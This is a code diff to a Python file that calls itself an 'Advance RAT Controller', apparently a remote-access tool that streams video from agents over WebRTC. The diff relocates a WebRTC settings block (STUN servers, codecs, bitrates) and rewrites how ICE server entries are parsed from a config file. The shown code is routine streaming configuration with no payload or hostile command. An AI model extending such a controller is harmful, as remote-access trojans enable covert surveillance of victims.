@@ -84,6 +84,51 @@ except ImportError:
     WEBRTC_AVAILABLE = False
     print("WebRTC (aiortc) not available - falling back to Socket.IO streaming")
 
+WEBRTC_CONFIG = {
+    'enabled': WEBRTC_AVAILABLE,
+    'ice_servers': [
+        {'urls': 'stun:stun.l.google.com:19302'},
+        {'urls': 'stun:stun1.l.google.com:19302'},
+        {'urls': 'stun:stun2.l.google.com:19302'},
+        {'urls': 'stun:stun3.l.google.com:19302'},
+        {'urls': 'stun:stun4.l.google.com:19302'}
+    ],
+    'codecs': {
+        'video': ['H.264', 'VP9', 'VP8'],
+        'audio': ['Opus', 'PCM']
+    },
+    'simulcast': True,
+    'svc': True,
+    'bandwidth_estimation': True,
+    'adaptive_bitrate': True,
+    'frame_dropping': True,
+    'quality_levels': {
+        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
+        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
+        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
+        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
+    },
+    'performance_tuning': {
+        'keyframe_interval': 2,
+        'disable_b_frames': True,
+        'ultra_low_latency': True,
+        'hardware_acceleration': True,
+        'gop_size': 60,
+        'max_bitrate_variance': 0.3
+    },
+    'monitoring': {
+        'connection_quality_metrics': True,
+        'automatic_reconnection': True,
+        'detailed_logging': True,
+        'stats_interval': 1000,
+        'quality_thresholds': {
+            'min_bitrate': 100000,
+            'max_latency': 1000,
+            'min_fps': 15
+        }
+    }
+}
+
 # Configuration Management
 class Config:
     """Configuration class for Advance RAT Controller"""
@@ -277,8 +322,21 @@ try:
         if isinstance(origin, str) and origin not in allowed_origins:
             allowed_origins.append(origin)
     _webrtc = _loaded.get('webrtc', {})
-    if 'iceServers' in _webrtc and _webrtc.get('iceServers') is not None:
-        WEBRTC_CONFIG['ice_servers'] = _webrtc['iceServers']
+    if _webrtc.get('iceServers') is not None:
+        servers = []
+        for s in _webrtc['iceServers']:
+            if isinstance(s, str):
+                servers.append({'urls': s})
+            elif isinstance(s, dict):
+                if 'urls' in s:
+                    merged = {'urls': s['urls']}
+                    for k, v in s.items():
+                        if k != 'urls':
+                            merged[k] = v
+                    servers.append(merged)
+                else:
+                    servers.append(s)
+        WEBRTC_CONFIG['ice_servers'] = servers
     if 'enabled' in _webrtc:
         WEBRTC_CONFIG['enabled'] = bool(_webrtc['enabled'])
 except Exception as _e:
@@ -356,51 +414,7 @@ def send_email_notification(subject: str, body: str) -> bool:
         print(f"Unexpected email notification error: {e}")
         return False
 
-# WebRTC Configuration
-WEBRTC_CONFIG = {
-    'enabled': WEBRTC_AVAILABLE,
-    'ice_servers': [
-        {'urls': 'stun:stun.l.google.com:19302'},
-        {'urls': 'stun:stun1.l.google.com:19302'},
-        {'urls': 'stun:stun2.l.google.com:19302'},
-        {'urls': 'stun:stun3.l.google.com:19302'},
-        {'urls': 'stun:stun4.l.google.com:19302'}
-    ],
-    'codecs': {
-        'video': ['H.264', 'VP9', 'VP8'],
-        'audio': ['Opus', 'PCM']
-    },
-    'simulcast': True,
-    'svc': True,
-    'bandwidth_estimation': True,
-    'adaptive_bitrate': True,
-    'frame_dropping': True,
-    'quality_levels': {
-        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
-        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
-        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
-        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
-    },
-    'performance_tuning': {
-        'keyframe_interval': 2,  # seconds
-        'disable_b_frames': True,
-        'ultra_low_latency': True,
-        'hardware_acceleration': True,
-        'gop_size': 60,  # frames at 30fps = 2 seconds
-        'max_bitrate_variance': 0.3  # 30% variance allowed
-    },
-    'monitoring': {
-        'connection_quality_metrics': True,
-        'automatic_reconnection': True,
-        'detailed_logging': True,
-        'stats_interval': 1000,  # ms
-        'quality_thresholds': {
-            'min_bitrate': 100000,  # 100 kbps
-            'max_latency': 1000,    # 1 second
-            'min_fps': 15
-        }
-    }
-}
+ 
 
 # WebRTC Global State
 WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
